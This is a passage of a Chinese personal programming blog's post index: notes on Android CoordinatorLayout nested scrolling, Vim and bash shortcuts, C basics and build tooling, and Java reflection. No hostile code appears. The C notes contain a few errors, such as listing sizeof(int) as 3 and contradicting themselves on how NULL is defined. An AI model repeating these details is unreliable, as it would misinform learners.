在RecyclerView的scrollByInternal里面调用了RecyclerView.dispatchNestedScroll -&gt;CoordinateLayout.onNestedScroll -&gt;CoordinatorLayout.onChildViewChanged -&gt; AppbarLayoutBehavior.onDependentViewChanged -&gt;AppbarLayout.onNestedScroll -&gt; AppbarLayout.Behavior.onNestedScroll RecyclerView(Action_UP)的时候调用顺序:RecyclerView.stopNestedScroll(这个其实不是让RecyclerView停下来，而是告诉parent应该停下来了)CoordinateLayout.onStopNestedScrollAppbarLayout.onStopNestedScrollAppbarLayout.Behavior.onStopNestedScrollAppbarLayout.Behavior.snapToChildIfNeeded(就是上面说的如果 scroll|enterAlways|snap都在时候的动画了) //注意AppbarLayout是有一个默认的behavior的 @CoordinatorLayout.DefaultBehavior(AppBarLayout.Behavior.class) public class AppBarLayout extends LinearLayout { } //在AppbarLayout的语义里，上下滑动的距离用的是offset这个关键字 //这又是一个public static class //在AppBarLayout.Behavior里面有这么一段 @Override public boolean layoutDependsOn(CoordinatorLayout parent, View child, View dependency) { // We depend on any AppBarLayouts return dependency instanceof AppBarLayout; } @Override public boolean onDependentViewChanged(CoordinatorLayout parent, View child, View dependency) { offsetChildAsNeeded(parent, child, dependency);//child就是底部在加了behavior的ViewPager,dependency是AppbarLayout.这里面就是调用了child.offsetTopAndBottom return false; } //从调用顺序来看，是加了behavior的View(底部的ViewPager)滑动时dispatchNestedPreScroll -&gt; CoordinatorLayout.onNestedPreScroll -&gt; CoordinatorLayout会一个个child去查，发现一个behavior不为Null的就会调用onChildViewsChanged-&gt; 这里面还是一个个遍历child(一个个问layoutDependsOn，内部实现是遍历每个child，然后针对每个child，拿着当前加上了behavior的views一个个(mDependencySortedChildren)来问，询问加了behavior的child的behavior，这个child是否感兴趣。。。一旦感兴趣就走onDependentViewChanged) // 在cheesequare的主页面，mDependencySortedChildren这个List&lt;View&gt;默认有三个元素AppBarLayout,ViewPager,FloatingActionButton(ViewPager是我们手动加上去的，其他两个都是default配备了behavior的)。由此看来，自己可以写一个behavior，加在CoordinatorLayout的child中，这样就能参与到mDependencySortedChildren这个过程中了 //在mDependencySortedChildren中，ViewPager是dependend on AppBarLayout的。也就是说加在ViewPager上的behavior // :app:layout_behavior=&quot;@string/appbar_scrolling_view_behavior&quot; 这玩意其实写在AppbarLayout中 public static class ScrollingViewBehavior extends HeaderScrollingViewBehavior { } //调用顺序 RecyclerView.onTouchEvent(ACTION_MOVE) RecyclerView.dispatchNestedPreScroll() NestedScrollChildHelper.dispatchNestedPreScroll() CoordinatorLayout.onNestedPreScroll(View 那个RecyclerView, int dx, int dy, int[] consumed, int type)//这里面一个个遍历child找加上了behavior的，调用behavior的onNestedPreScroll CoordinatorLayout.onChildViewsChanged(EVENT_NESTED_SCROLL)//这里面就是一个个遍历child，拿着child去问加了bahavior的view“这是你想要的吗”，如果是肯定答复，会走到onDependentViewChanged（CoordinatorLayout,View 加了behavior的view,View behavior感兴趣的View）.所以多数的实现都可以在这里动手。又因为加了bahavior的view事实上是一个list，事实上可以随便加任意多个带behavior的view。 // https://github.com/saulmm/CoordinatorBehaviorExample中的实现如下。 @Override public boolean layoutDependsOn(CoordinatorLayout parent, CircleImageView child, View dependency) { return dependency instanceof Toolbar; } @Override public boolean onDependentViewChanged(CoordinatorLayout parent, CircleImageView child, View dependency) { maybeInitProperties(child, dependency); final int maxScrollDistance = (int) (mStartToolbarPosition); float expandedPercentageFactor = dependency.getY() / maxScrollDistance; if (expandedPercentageFactor &lt; mChangeBehaviorPoint) { float heightFactor = (mChangeBehaviorPoint - expandedPercentageFactor) / mChangeBehaviorPoint; float distanceXToSubtract = ((mStartXPosition - mFinalXPosition) * heightFactor) + (child.getHeight()/2); float distanceYToSubtract = ((mStartYPosition - mFinalYPosition) * (1f - expandedPercentageFactor)) + (child.getHeight()/2); child.setX(mStartXPosition - distanceXToSubtract); child.setY(mStartYPosition - distanceYToSubtract); float heightToSubtract = ((mStartHeight - mCustomFinalHeight) * heightFactor); CoordinatorLayout.LayoutParams lp = (CoordinatorLayout.LayoutParams) child.getLayoutParams(); lp.width = (int) (mStartHeight - heightToSubtract); lp.height = (int) (mStartHeight - heightToSubtract); child.setLayoutParams(lp); } else { float distanceYToSubtract = ((mStartYPosition - mFinalYPosition) * (1f - expandedPercentageFactor)) + (mStartHeight/2); child.setX(mStartXPosition - child.getWidth()/2); child.setY(mStartYPosition - distanceYToSubtract); CoordinatorLayout.LayoutParams lp = (CoordinatorLayout.LayoutParams) child.getLayoutParams(); lp.width = (int) (mStartHeight); lp.height = (int) (mStartHeight); child.setLayoutParams(lp); } return true; } 上述一个个询问加了behavior的child的过程其实叫做onChildViewChanged(EVENT_NESTED_SCROLL),该方法会在CoordinatorLayout的onNestedFling,onNestedPreScroll,onNestedScroll,onChildViewRemoved,onPreDraw中都会调用到。所以在这里相应滑动是足够的。上述例子里面就是在onDependentViewChanged中获取当前target的getY，对此作出textView的缩放。 接下来看一大堆接口: public interface NestedScrollingParent { boolean onStartNestedScroll(@NonNull View child, @NonNull View target, @ScrollAxis int axes); void onNestedScrollAccepted(@NonNull View child, @NonNull View target, @ScrollAxis int axes); void onStopNestedScroll(@NonNull View target); void onNestedScroll(@NonNull View target, int dxConsumed, int dyConsumed, int dxUnconsumed, int dyUnconsumed); void onNestedPreScroll(@NonNull View target, int dx, int dy, @NonNull int[] consumed); boolean onNestedFling(@NonNull View target, float velocityX, float velocityY, boolean consumed); boolean onNestedPreFling(@NonNull View target, float velocityX, float velocityY); int getNestedScrollAxes(); } public interface NestedScrollingParent2 extends NestedScrollingParent { boolean onStartNestedScroll(@NonNull View child, @NonNull View target, @ScrollAxis int axes, @NestedScrollType int type); void onNestedScrollAccepted(@NonNull View child, @NonNull View target, @ScrollAxis int axes, @NestedScrollType int type); void onStopNestedScroll(@NonNull View target, @NestedScrollType int type); void onNestedScroll(@NonNull View target, int dxConsumed, int dyConsumed, int dxUnconsumed, int dyUnconsumed, @NestedScrollType int type); void onNestedPreScroll(@NonNull View target, int dx, int dy, @NonNull int[] consumed, @NestedScrollType int type); } // 似乎就是添加了一个NestedScrollType @IntDef({TYPE_TOUCH, TYPE_NON_TOUCH}) @Retention(RetentionPolicy.SOURCE) @RestrictTo(LIBRARY_GROUP) public @interface NestedScrollType {} public interface NestedScrollingChild { void setNestedScrollingEnabled(boolean enabled); boolean isNestedScrollingEnabled(); boolean startNestedScroll(@ScrollAxis int axes); void stopNestedScroll(); boolean hasNestedScrollingParent(); boolean dispatchNestedScroll(int dxConsumed, int dyConsumed, int dxUnconsumed, int dyUnconsumed, @Nullable int[] offsetInWindow); boolean dispatchNestedPreScroll(int dx, int dy, @Nullable int[] consumed, @Nullable int[] offsetInWindow); boolean dispatchNestedFling(float velocityX, float velocityY, boolean consumed); boolean dispatchNestedPreFling(float velocityX, float velocityY); } public interface NestedScrollingChild2 extends NestedScrollingChild { boolean startNestedScroll(@ScrollAxis int axes, @NestedScrollType int type); void stopNestedScroll(@NestedScrollType int type); boolean hasNestedScrollingParent(@NestedScrollType int type); boolean dispatchNestedScroll(int dxConsumed, int dyConsumed, int dxUnconsumed, int dyUnconsumed, @Nullable int[] offsetInWindow, @NestedScrollType int type); boolean dispatchNestedPreScroll(int dx, int dy, @Nullable int[] consumed, @Nullable int[] offsetInWindow, @NestedScrollType int type); } //似乎也只是加了一个NestedScrollType，2是1的子类 //看一下继承关系 public class SwipeRefreshLayout extends ViewGroup implements NestedScrollingParent, NestedScrollingChild { } public class NestedScrollView extends FrameLayout implements NestedScrollingParent, NestedScrollingChild2, ScrollingView { } public class RecyclerView extends ViewGroup implements ScrollingView, NestedScrollingChild2 { } public class CoordinatorLayout extends ViewGroup implements NestedScrollingParent2 { } 关于CoordinatorLayout的比较好的教程 SwipeRefreshLayout里面有一个OnChildScrollUpCallback用于决定是否可以拦截实践，比setEnabled要好很多CoordinateLayout inside SwipeRefreshLayout的问题似乎可以从这里去解决","tags":[{"name":"android","slug":"android","permalink":"https://haldir65.github.io/tags/android/"}]},{"title":"Vim常用命令指南","date":"2018-08-26T22:49:00.000Z","path":"2018/08/26/2018-08-26-vim-the-editor/","text":"首先是一些加快terminal 中操作的命令，跟vim没什么关系 在bash中，几个比较方便的快捷键(zsh可能不一样)sudo !! - re-run previous command with ‘sudo’ prepended ##敲命令忘记加sudo了，直接sudo!!，把上一个命令加上sudo执行一遍 ctrl-k（剪切掉光标之后的文字）ctrl-y(把ctrl k剪切的文字粘贴上来)ctrl-u(清空当前行)ctrl-w(remove word by word) use ‘less +F’ to view logfiles, instead of ‘tail’ (ctrl-c, shift-f, q to quit)ctrl-x-e - continue editing your current shell line in a text editor (uses $EDITOR)alt-. - paste previous command’s argument (useful for running multiple commands on the same resource) 在当前目录下查找”python”这几个字符 grep -ni “python” * //如果要递归，就是碰到子文件夹就往下找 这个命令好在能够显示在哪个文件的哪一行找到的 接下来是vim常用的一些 首先是command mode下的 k h l j 挪到文件开头: H 挪到文件头部是gg挪到文件最后: L 挪到文件底部是G 删除本行开始到文件开始: dgg删除本行到文件末尾dG 走到第5行： 5G 复制当前行: yy复制2行： 2yy刚才复制的东西要粘贴: p(光标后粘贴)，P(光标前粘贴)复制当前单词: yw 剪切当前行: dd剪切2行: 2dd剪切当前单词: dw 从光标位置到行末尾全部剪切：D(D$也行) 撤销刚才的操作(undo): u 走到当前行的末尾: $走到当前行的开头: 0 走到文档开头[[走到文档末尾]] 在vim中执行bash命令：vim all.txt:read !ls//ls的结果被直接写入当前文件 visual mode进入visual mode之后就可以大段的复制粘贴了 还可以全文搜索按一个/（斜杠就可以了），按n时是下查找下一个匹配结果 全局替换:s/要被替换的文字/新的文字/g ，g是全局的意思 VIM格式化代码：格式化全文指令 gg=G //这其实是三个命令,gg是到达文档开始,=是要求缩进，G是到达文档最后一行自动缩进当前行指令 ==格式化当前光标接下来的8行 8=格式化选定的行 v 选中需要格式化的代码段 = 很多人都会有一个vimrc文件备份在github上，那么vimrc其实就是对于vim这个编辑器的配置文件全局的vimrc文件在/etc/vim/vimrc 这个位置，针对单个用户还是在~/.vimrc这个文件里面改 set number &quot;显示行号，这个注释只要左边的冒号就行了 syntax on “自动语法高亮 set shiftwidth=4 “默认缩进4个空格 set softtabstop=4 “使用tab时 tab空格数 set tabstop=4 “tab 代表4个空格 set expandtab “使用空格替换tab 比较出名的vimrc是the ultimate vimrc，自带一些比较好的插件首先在任意目录,输入vim。任何时候想要退出vim的话 :q 就可以了 一些好用的插件：NERDTree是一个类似于file browser的插件ctrl + w + h 光标 focus 左侧树形目录ctrl + w + l 光标 focus 右侧文件显示窗口ctrl + w + w 光标自动在左右侧窗口切换ctrl + w + r 移动当前窗口的布局位置o 在已有窗口中打开文件、目录或书签，并跳到该窗口go 在已有窗口 中打开文件、目录或书签，但不跳到该窗口t 在新 Tab 中打开选中文件/书签，并跳到新 TabT 在新 Tab 中打开选中文件/书签，但不跳到新 Tabi split 一个新窗口打开选中文件，并跳到该窗口gi split 一个新窗口打开选中文件，但不跳到该窗口s vsplit 一个新窗口打开选中文件，并跳到该窗口gs vsplit 一个新 窗口打开选中文件，但不跳到该窗口:tabnew [++opt选项] ［＋cmd］ 文件 建立对指定文件新的tab:tabc 关闭当前的 tab:tabo 关闭所有其他的 tab:tabs 查看所有打开的 tab:tabp 前一个 tab:tabn 后一个 tab vim-fugitive fugitive.vim: A Git wrapper so awesome, it should be illegal ctrl +f 就是激活ctrlp这个插件，类似于文件搜索 内置了vim-markdown。默认已经可以实现markdown语法高亮。默认是自动把段落收起来的，光标一直挪到右边就自动展开了 自动补全，在编辑模式(i) ，Ctrl+ p 参考vim cheat sheetyoutube上一个比较好的关于vim的视频练上一年再来总结的vim使用技巧","tags":[{"name":"linux","slug":"linux","permalink":"https://haldir65.github.io/tags/linux/"}]},{"title":"C语言学习手册","date":"2018-07-29T17:47:28.000Z","path":"2018/07/29/2018-07-29-Learn-to-program-with-c/","text":"C语言实用指南，暂时不涉及cpp内容 1.基本数据类型C的基本数据类型还是很多的 居然还有unsigned long long int 这种别扭的东西。size_t 和int差不多，估摸着是跨平台的一种表示。 描述 数据类型 sizeof(64位linux下) 字符 char 1 短整数 short 2 整数 int 3 长整数 long 8 单精度浮点数 float 4 双精度浮点数 double 8 无类型 void 1 scanf方法存在内存溢出的可能性，微软提出了scanf_s函数，需要提供最多允许读取的长度，超出该长度的字符一律忽略掉。汇编语言 NULL 值NULL在stdio.h实际上是#define NULL ((void *) 0)，而在 C++ 中则直接被定义为了 0，#define NULL 0。 float a = 1.0f; double b = 1.0d; long double ld = 1.0l; //长浮点数 // 如果不指定后缀f，则默认为double型 无符号数 char short int long默认都是有符号的，首位用来存储符号位。如果不需要使用负数，则可以使用无符号数，只要在前面加上unsigned即可。如unsigned char unsigned short、unsigned int、unsigned long，其中unsigned int可以简写为unsigned。 bool(boolean)不是一种基本数据类型，在c99及以后可以用是因为”it’s still not a keyword. It’s a macro declared in .” #include&lt;stdio.h&gt; #include&lt;stdbool.h&gt; void main(){ bool x = true; if(x) printf(&quot;Boolean works in &#39;C&#39;. \\n&quot;); else printf(&quot;Boolean doesn&#39;t work in &#39;C&#39;. \\n&quot;); } string in cchar *name = “Bob”; //name指向的位置不能修改了，但是name可以指向别的东西.// the value is stored in a read-only section in the binary file and cannot be modifiedname[1] = ‘e’; //这么干是不行的，编译是能通过，但运行期会造成undefined behavior，大概率是segment fault You can also define a string as a pointer to a char, initialised by a string literal. In this case, string literals are stored in a read only section of memory and are effectively constant. For example: char *name = &quot;Bob&quot; In this case, the value is stored in a read-only section in the binary file and cannot be modified. If you compile to an assembly file (use the -S compiler option in gcc), you can see the string literals in the .rodata section. In this context, rodata means “read-only data”. /* main.s */ .file &quot;main.c&quot; .section .rodata .LC0: .string &quot;Bob&quot; // 下面这种用数组形式声明的是可以随便改的char name[] = “Alice”; //存在stack上，随便改name[3] = ‘n’;name[4] = ‘a’; 在C中，NULL表示的是指向0的指针 #define NULL 0 string.h 标准库中定义了空指针，NULL(数值0)在C/C++中，当要给一个字符串添加结束标志时，都应该用‘\\0’而不是NULL或0 ‘\\0’是一个“空字符”常量，它表示一个字符串的结束，它的ASCII码值为0。注意它与空格’ ‘（ASCII码值为32）及’0’（ASCII码值为48）不一样的。 编译过程中有时候可能会出现一些警告“Implicit declaration of function ‘sleep’ is invalid in C99”比如这里使用了sleep函数,却忘记了include对应的函数，就会报警告 sleep is a non-standard function. On UNIX, you shall include &lt;unistd.h&gt;. On MS-Windows, Sleep is rather from &lt;windows.h&gt;. 2. 编译过程的一些解释C语言程序编译的顺序是source code -&gt; preprocessing -&gt; compilating -&gt; assembling -&gt; linking -&gt; executable file 1. 预处理 cat hello_world.c #include &lt;stdio.h&gt; #define EXAMPLE &quot;example\\n&quot; int main(void) { printf(&quot;hello world!\\n&quot;); printf(EXAMPLE); return 0; } gcc -E hello_world.c | tail -10需要tail以下，因为预处理阶段会把stdio.h中所有代码复制粘贴进来 # 499 &quot;/usr/include/stdio.h&quot; 2 3 4 # 2 &quot;hello_world.c&quot; 2 int main(void) { printf(&quot;hello world!\\n&quot;); printf(&quot;example\\n&quot;); return 0; } ➜ 2.compiling在这一过程中，编译器将c这样的high level language转成assembly code.(直接转成machine code不太现实)，同一份代码在不同的机器上最终变成的machine code可能相差很大Assembly code是human readable的我们可以用-S让编译器走到汇编这一步就打住 gcc -S hello_world.c cat hello_world.s | head -15 汇编看起来是这样的 .section __TEXT,__text,regular,pure_instructions .macosx_version_min 10, 12 .globl _main .p2align 4, 0x90 _main: ## @main .cfi_startproc ## BB#0: pushq %rbp Lcfi0: .cfi_def_cfa_offset 16 Lcfi1: .cfi_offset %rbp, -16 movq %rsp, %rbp Lcfi2: .cfi_def_cfa_register %rbp 3. 接下来是assembling这一步,编译器把汇编文件转成machine code,也就是cpu可以直接执行的代码。可以使用-c 让编译器在这里打住 gcc -c hello_world.c lshello_world.c hello_world.o cat hello_world.o | head -15 ##尝试用cat去看二进制文件，其实并没有用```���� �� �textTEXT; ��cstringTEXT;[compact_unwindLDX x�eh_frameTEXTx@� h$ PUH��H��H�=,�E���H�=%�E��1ɉE��H��]�hello world!example;zRx*- -$h�������;A�C _main_printf% 这什么鬼👻 - od -c hello_world.o | head -5 0000000 317 372 355 376 \\a \\0 \\0 001 003 \\0 \\0 \\0 001 \\0 \\0 \\0 0000020 004 \\0 \\0 \\0 \\0 002 \\0 \\0 \\0 \\0 \\0 \\0 \\0 \\0 \\0 0000040 031 \\0 \\0 \\0 210 001 \\0 \\0 \\0 \\0 \\0 \\0 \\0 \\0 \\0 \\0 0000060 \\0 \\0 \\0 \\0 \\0 \\0 \\0 \\0 \\0 \\0 \\0 \\0 \\0 \\0 \\0 \\0 0000100 270 \\0 \\0 \\0 \\0 \\0 \\0 \\0 002 \\0 \\0 \\0 \\0 \\0 \\0 这才像样嘛 ### 4. linking 链接是编译的最后一步，这一步编译器将所有的机器码文件(也就是.o文件)合成可执行文件。不需要传什么flag,直接gcc hello_world.c就可以了 默认生成的文件名叫做a.out,可以使用-o参数指定生成的文件名。然后./a.out就可以执行了 .so文件其实是shared object的缩写 ## 4. Makefile怎么写 [几个简单的makefile实例](http://www.cs.colby.edu/maxwell/courses/tutorials/maketutor/) // 比方说写了三个文件,main.c,test.c,test.h。这是最简单的例子 main: main.c gcc -o main main.c test.c //ok,没问题了 gcc -std=c11 -o outputfile sourcefile.c //指定使用c11(似乎目前c99有点老了)，Makefile里面加上CFLAGS = -Wall -std=c99就可以了 [C Programming: Makefiles](https://www.youtube.com/watch?v=GExnnTaBELk) make clean clean: rm -f *.o program_name 因为手动rm可能写成 rm -f * .o ##中间多一个空格 ## 5. 静态库和动态库的区别及使用 [static and dynamic libraries](https://www.geeksforgeeks.org/static-vs-dynamic-libraries/) static library把依赖的library都打包进去了，体积更大 dynamic libvrary只是写了依赖的library的名称，运行时需要去操作系统中去找，会慢一些 ### static library(compile time已完成link，而dynamic library需要在runtime完成link) 查看archive文件中的内容 ar -tv libmylib.a nm somebinaryfile ## 查看动态和静态库中的符号表 ls /usr/lib ## 文件夹中又各种lib,包括so文件和.a文件 ls /usr/include # 这里也有一大堆头文件 clang wacky.c -L. -lwacky -o wacky ## -L. 表示在当前目录下查找后面的libwacky.so或者libwacky.a文件。所以完全可以link 系统中存在的(/usr/lib目录中)的library并compile到program中 Makefile for bundling static library（每一个chunk叫做recepie） 不能用空格，需要用Tab default: wacky wacky: libwacky.a wacky.c clang wacky.c -L. -lwacky -o wacky libwacky.a: wacky_math.o ar -rcv $@ $^ ### dynamic library wacky_math.o: wacky_math.c wacky_math.h clang -c -fPIC wacky_math.c -o $@ -fPIC使得生成的object file是relocateable的 同时还得告诉run time linke如何去找这个so文件 man ldpath ## so文件查找目录 export LD_LIBRARY_PATH=. ## 添加当前目录为查找路径 //一般so文件都在/usr/lib或者/usr/local/lib文件夹下面 locate sodium.so make wacky 也是可以的，可以指定编译target 还有一种动态查找第三方库的方法 [dlopen和soname](https://renenyffenegger.ch/notes/development/languages/C-C-plus-plus/GCC/create-libraries/index) ## 6. 如何使用第三方库 在c program中使用其他的library以及如何编译生成可执行文件 [以mysql的c库为例](https://blog.csdn.net/yanxiangtianji/article/details/20474155) 如果库在 usr/include/ 目录下，那么就用 #include &lt; *.h &gt;。这个目录下面放的都是些头文件 如果库在当前目录下，就用 #include &quot;mylib.h&quot; gcc -v可以查看compile gcc时预设的链接静态库的搜索路径 默认情况下， GCC在链接时优先使用动态链接库，只有当动态链接库不存在时才考虑使用静态链接库，如果需要的话可以在编译时加上-static选项，强制使用静态链接库。 从项目结构来看,curl,ffmpeg这些都是一个文件夹里面放了所有的.h和.c文件。似乎没有其他语言的package的观念。我试了下，在Makefile里面带上文件夹的相对路径还是可以的。 ## 7. visual studio等工具使用 [windows平台使用visual studio创建C项目](https://www.youtube.com/watch?v=Slgwyta-JkA) File -&gt; new Project -&gt;Windows DeskTop Wizard -&gt; 选中Empty Project -&gt; 取消选中Precompile Header 然后右侧，source File,右键，new item。创建main.c(任意名字.c都是行的),然后写主函数。 运行的话，点上面的local windows debugger是可以的，但是会一闪而过。按下ctrl +F5，会出现console。 visual studio中断点的step into是f11，step out of 是shift + f11 .step over是f10 evaluate expression在右下角的immediate window中输入表达式即可 visual studio中debug的时候有时候会出现Cannot find or open the PDB file [intel说这种事不是error](https://software.intel.com/en-us/articles/visual-studio-debugger-cannot-find-or-open-the-pdb-file)。所以就不要去管好了。 [Linux下安装、配置libevent](http://hahaya.github.io/build-libevent/) [使用libevent输出Hello](http://hahaya.github.io/hello-in-libevent/) unix下安装libevent的教程 1. 在官网上下载对应版本的包 2. tar -zxvf /your path/libevent-1.4.14b-stable.tar.gz解压到当前目录 3. cd libevent-1.4.14b-stable 4. ./configure 5. make &amp;&amp; make install (这一段似乎要root权限) 6. 在/usr/local/lib目录下应该可以看见大量的动态链接库了,这时运行ln -s /usr/local/lib/libevent-1.4.so.2 /usr/lib/libevent-1.4.so.2命令(这是为了防止在系统默认路径下 找不到库文件,也可以使用gcc中的-L参数来指定库文件的位置所在) 7. 接下来就可以使用libevent库来编写我们的代码了 mac上查看某个library是否install了： &gt; ld -ljson-c ##看下json-c这个library是否已经安装了 d: library not found for -ljson-c ##这种就是没有找到 照说一般这种library都是装在/usr/lib 或 /usr/local/lib 下的 ls -al /usr/lib | grep libevent ls -al /usr/local/lib | grep libevent 试一下就行了 printf(&quot;Error: %d (%s)\\n&quot;, errno, strerror(errno)) ### autoconf等工具的使用教程 经常会看到项目里面的安装指南包括./configure make.. GNU的AUTOCONF和AUTOMAKE ./config &amp;&amp; make &amp;&amp; sudo make install || exit 1 比如说awk的安装过程是这样的 wget http://ftp.gnu.org/gnu/gawk/gawk-4.1.1.tar.xz tar xvf gawk-4.1.1.tar.xz cd gawk-4.1.1 &amp;&amp; ./configure make make check sudo make install 如何生成一个auto build file [auto build configure file](https://stackoverflow.com/questions/10999549/how-do-i-create-a-configure-script) autoconf和automake的使用教程 ## 8. 语法 ### 指针 在C语言中没有泛型。故采用void 指针来实现泛型的效果。 这段会core dump的 ```c char *s1 = &quot;hello&quot;; ##获得了一个指向字符串常量的指针 *s1 = &#39;hey&#39;; ##编译期会警告：implicit conversion from &#39;int&#39; to &#39;char&#39; changes value from 6841721 to 121 [-Wconstant-conversion]。运行期会出现会 出现[1] 5972 bus error 。 改成s1 = &#39;hey&#39;; 就好了 ##这段也会core dump char* s1 = &quot;hello&quot;; s1 += 1; printf(&quot;content %s\\n&quot;,*s1);##崩在这里 printf(&quot;content %s\\n&quot;,s1);##改成这样就好了 static关键字c语言中不同头文件中的方法名或者外部变量是不能重名的（所以给方法起名字的时候要注意下），除非使用static关键字（只在该源文件内可以使用） 静态变量存放在全局数据区，不是在堆栈上，所以不存在堆栈溢出的问题。生命周期是整个程序的运行期。（static变量只在当前文件中可以使用，一旦退出当前文件的调用，就不可用，但如果运行期间又调用了该文件，那么static变量的值就会是刚才退出的时候的值，而不是default值）设计和调用访问动态全局变量、静态全局变量、静态局部变量的函数时，需要考虑重入问题。函数名冲突的问题也可以用一个struct封起来c语言const关键字有的时候是说指针指向的对象不能动，有的时候说的是指针指向的值不能动 宏preprocessor的套路一般是这样的awesomeFunction.h #ifndef AWESOME_FUNCTION #define AWESOME_FUNCTION ## 实际的函数声明 #endif //AWESOME_FUNCTION 宏出现的缘由 c/c++是编译语言，做不到“一次编译到处运行”，这里的“到处”指的是不同编译器或不同系统因为程序的大多数功能都需要调用编译器提供的库函数，使用操作系统提供的系统资源和API等，这些在不同编译器或不同系统上都是不同的所以一般的方法是通过预编译宏来处理这一类需求，在不同的系统上使用不同的宏来编译同一个文件里不同版本的代码，来做到“一次编写到处编译” 看到有人在segmentfault说了这样一段总结，深以为然 对于编程语言，基本上是这样进化的： 先用机器语言写出汇编器，然后就可以用汇编语言编程了，然后再用汇编语言编写汇编器。 先用汇编语言写出 C 编译器，然后就可以用 C 语言编程了，然后再用 C 语言来写 C 编译器。 有了 C 编译器与 C 语言，就可以在这个基础上再编写高级语言的编译器或解释器或虚拟机了。 非 C 系语言，进化过程同上。至于操作系统，先用汇编语言写一个操作系统。Ken Thompson 干过这样的事，他用汇编语言以及他自创的一种解释性语言——B 语言写出来 unix 第一版，是在一台内存只有 8KB 的废弃的计算机上写出来的。然后 Dennis Ritchie 发明了 C 语言，然后 Ken 与 Dennis 又用 C 语言在一台更好的计算机——16 位机器上将 unix 重写了一遍。至于 Windows 系统，MS 先是买了 QDOS，然后又在 QDOS 里引入了一些 Unix 的元素，然后比尔·盖茨靠着这个买来的系统赚了一大笔钱，然后就在 DOS 系统上开发了 windows 3.1，windows 95 …… ==========================================tbd 3. gcc ,clang,llvm的历史c语言中的未定义行为(比如说数组越界)c语言的goto fail 最后c语言就是这样，好多功能都得自己实现 c 语言有它的设计哲学，就是那著名的“Keep It Simple, Stupid”，语言本身仅仅实现最为基本的功能，然后标准库也仅仅带有最为基本的内存管理（更高效一点的内存池都必须要自己实现）、IO、断言等基本功能。 社区提供了一些比较优秀的通用功能库[1] http://developer.gnome.org/glib/stable/[2] http://www.gnu.org/software/gnulib/[3] http://apr.apache.org/ gets在c11中被gets_s替代 参考automatic directory creation in make本文的参考","tags":[{"name":"linux","slug":"linux","permalink":"https://haldir65.github.io/tags/linux/"},{"name":"C","slug":"C","permalink":"https://haldir65.github.io/tags/C/"}]},{"title":"pragmatic-java-chetsheet","date":"2018-07-05T23:05:52.000Z","path":"2018/07/05/2018-07-05-pragmatic-java-chetsheet/","text":"反射 如何获得一个class对象 Class class1 = null; Class class2 = null; Class class3 = null; try { class1 = Class.forName(&quot;com.example.test.javareflect.ReflectClass&quot;); // java语言中任何一个java对象都有getClass 方法 class2 = new ReflectClass().getClass(); //java中每个类型都有class 属性 class3 = ReflectClass.class; // 由于class是单例，所以class1 == class2 == class3 } catch (ClassNotFoundException e) { e.printStackTrace(); } 如何检查一个Class中的所有constructor package com.me.reflection._001_basic; public class MyObject { public String name; public int age; public MyObject(String name) { this.name = name; } public MyObject(String name, int age) { this.name = name; this.age = age; } public MyObject(int age) { this.age = age; } public MyObject() { } } public void checkInitParams(){ Constructor&lt;?&gt; constructor[] = MyObject.class.getConstructors(); for (int i = 0; i &lt; constructor.length; i++) { // 运行期这个length是4，如果上面的Object中不手动添加构造函数的话，这个数是1 Class arrayClass[] = constructor[i].getParameterTypes(); System.out.print(&quot;cons[&quot; + i + &quot;] (&quot;); for (int j = 0; j &lt; arrayClass.length; j++) { if (j == arrayClass.length - 1) System.out.print(arrayClass[j].getName()); else System.out.print(arrayClass[j].getName() + &quot;, &quot;); } System.out.println(&quot;)&quot;); } } 输出(我怀疑这个顺序是按照字母顺序来的) cons[0] ()cons[1] (int)cons[2] (java.lang.String, int)cons[3] (java.lang.String) 实例化一个object，假设有很多个构造函数的话 public void createViaReflection(){ String className = &quot;com.me.reflection._001_basic.MyObject&quot;; try { Class clazz = Class.forName(className); Constructor cons = clazz.getConstructor(String.class); //我们希望要获得一个String参数的构造函数 Object obj = cons.newInstance(&quot;passing value via constructor is ok -ish&quot;); System.out.println(obj); } catch (ClassNotFoundException e) { e.printStackTrace(); } catch (NoSuchMethodException e) { e.printStackTrace(); } catch (IllegalAccessException e) { e.printStackTrace(); } catch (InstantiationException e) { e.printStackTrace(); } catch (InvocationTargetException e) { e.printStackTrace(); } } MyObject{name=’passing value via constructor is ok -ish’, age=0} 获取一个class中所有的Fileds（private的也能拿到） public void getAllFields(){ try { String className = &quot;com.me.reflection._001_basic.MyObject&quot;; Class rClass = Class.forName(className); // Field: 获取属性，下面还会讲到获取类的方法，注意区分 Field field[] = rClass.getDeclaredFields(); for (int i = 0; i &lt; field.length; i++) { System.out.println(field[i].getName()); // 获取修饰权限符 int mo = field[i].getModifiers(); System.out.println(&quot;mo: &quot;+mo); String priv = Modifier.toString(mo); // 属性类型 Class type = field[i].getType(); System.out.println(priv + &quot; &quot; + type.getName() + &quot; &quot; + field[i].getName()); } } catch (ClassNotFoundException e) { e.printStackTrace(); } } 输出： namemo: 1public java.lang.String nameagemo: 2private int age 获得一个class中所有的方法(拿不到private的和构造函数，父类的wait,notfy这些反而能够拿到),getMethod只能拿到public的方法，getDeclaredMethod基本上是什么类型的都能拿到(getDeclaredMethods，有个s) public void getAllMethods(){ try { String className = &quot;com.me.reflection._001_basic.MyObject&quot;; Class fClass = Class.forName(className); // Method[]: 方法数组 Method method[] = fClass.getMethods(); for (int i = 0; i &lt; method.length; i++) { // returnType :返回类型 Class returnType = method[i].getReturnType(); System.out.println(&quot;ReturnType: &quot;+returnType); // 获取参数类型 Class para[] = method[i].getParameterTypes(); int temp = method[i].getModifiers(); System.out.print(&quot;Modifier.toString: &quot;+Modifier.toString(temp) + &quot; &quot;); System.out.print(returnType.getName() + &quot; &quot;); System.out.print(method[i].getName() + &quot; &quot;); System.out.print(&quot;(&quot;); for (int j = 0; j &lt; para.length; ++j) { System.out.print(para[j].getName() + &quot; &quot; + &quot;arg&quot; + j); if (j &lt; para.length - 1) { System.out.print(&quot;,&quot;); } } // 获取异常类型 Class&lt;?&gt; exce[] = method[i].getExceptionTypes(); if (exce.length &gt; 0) { System.out.print(&quot;) throws &quot;); for (int k = 0; k &lt; exce.length; ++k) { System.out.print(exce[k].getName() + &quot; &quot;); if (k &lt; exce.length - 1) { System.out.print(&quot;,&quot;); } } } else { System.out.print(&quot;)&quot;); } System.out.println(); } } catch (ClassNotFoundException e) { e.printStackTrace(); } } 测试下来，这个方法能够拿到自己写的public方法，private方法似乎拿不到,还有，这里面似乎拿不到构造函数 ReturnType: voidModifier.toString: public final void wait (long arg0,int arg1) throws java.lang.InterruptedExceptionReturnType: voidModifier.toString: public final native void wait (long arg0) throws 